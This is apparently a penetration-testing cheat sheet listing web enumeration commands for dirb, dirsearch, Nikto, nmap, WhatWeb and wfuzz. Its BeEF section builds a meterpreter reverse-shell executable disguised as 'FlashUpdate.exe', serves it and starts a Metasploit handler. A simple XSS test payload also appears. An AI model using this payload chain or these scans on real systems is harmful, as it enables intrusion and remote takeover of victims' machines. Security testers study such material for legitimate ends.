# Basic Web Enumeration

## Objectives

Basic Web Enumeration Tools and Examples

## Beef

Create Payload:

```text
msfvenom ­a x86 ­­platform Windows ­p windows/meterpreter/reverse_tcp lhost=10.10.75.1 lport=4444 ­f exe ­o /tmp/FlashUpdate.exe
```

Serve Simple Web Page:

```text
python -­m SimpleHTTPServer 8000 &
```

Start MSF Handler:

```text
root@slingshot:~# msfconsole -­q
set PAYLOAD windows/meterpreter/reverse_tcp PAYLOAD => windows/meterpreter/reverse_tcp
set LHOST 10.10.75.1
msf exploit(handler) > exploit
```

Start Beef:

```text
cd /opt/beef
./beef
```

## Dirbuster

Dirbuster from Command Line - tool is GUI-based where more settings can be configured:

```text
dirb http://192.168.1.5/dvwa
```

DIRB can identify valid web pages on a web server even if the main index page is missing:

```text
dirb http://www.megacorpone.com -r -z 10
```

Dirbuster with Metasploit:

```text
use auxiliary/scanner/http/dir_scanner   
msf auxiliary(dir_scanner) >set dictionary /usr/share/wordlists/dirb/common.txt
msf auxiliary(dir_scanner) >set rhosts 192.168.1.5
msf auxiliary(dir_scanner) > set path /dvwa
msf auxiliary(dir_scanner) >exploit
```

## Dirsearch

Basic Dirsearch Checking

```text
./dirsearch.py –u http://192.18.1.5/dvwa -e php -f -x 400,403,404
```

## Nikto

Nikto Resource: [https://redteamtutorials.com/2018/10/24/nikto-cheatsheet/](https://redteamtutorials.com/2018/10/24/nikto-cheatsheet/)

Update the plugins and databases

```text
nikto -update
```

Scanning a host and specifying an amount of time for a scan

```text
nikto -h <Hostname/IP>
nikto -host=<hostname/IP> -maxtime=30s
```

Specify host header

```text
nikto -h <Hostname/IP> -vhost
```

Only perform an SQL injection test against your target:

```text
nikto -Tuning 9 -h example.com
```

Run everything except DOS:

```text
nikto -Tuning x 6 -h example.com
```

Perform an SQL injection test and save results to an html file with verbose output for your terminal:

```text
nikto -Display V -o results.html -Format htm -Tuning 9 -h example.com
```

The following command will run a Nmap scan on host 192.168.0.0 – 192.168.0.24 using a grepable output which is defined by the -oG- flag:

```text
nmap -p80 10.0.0.0/24 -oG – | nikto -h –
```

Simple browser script to test for XSS flaws:

```text
<script>alert("Vulnerable!");</script>
http://10.0.0.10/index.php?loc=<script>alert("Vulnerable!");</script>
```

Nikto: Scan PROD Server

```text
'export PROD=box.to.scan'
nikto.pl -C "none" -h $PROD -findonly - skips CGI, reconnaissance only
nikto.pl -C "none" -h $PROD -Plugins "robots" - searches for 'robots.txt' problems
nikto.pl -C "none" -h $PROD -findonly -D 2 - reconnaissance that reveals COOKIES
nikto.pl -D V -o nikto.log.1.txt -h $STAGING - creates local log file in directory from which 'nikto.pl' was executed
nikto.pl -D V -o nikto.log.recon.1.txt -h $STAGING -findonly - will NOT log to FILE, but rather: STDOUT
nikto.pl -C none -D V -o nikto.log.recon.`date +%s`.html -Format htm -h 10.0.0.1 - spaces LOG files by seconds
```

## Skipfish:

skipfish -o OUTPUT\_DIRECTORY TARGET\_URL skipfish -o linuxcbt.internal [https://www.linuxcbt.internal](https://www.linuxcbt.internal)

## WhatWeb

Use Whatweb to enumerate details on the website \(can also use their website, as well\):

```text
whatweb https://www.test.com/
```

## Wfuzz

```text
wfuzz -c -W /usr/share/wfuzz/wordlist/dir/common.txt --hc 400,404,403 http://192.168.1.5/dvwa/
```

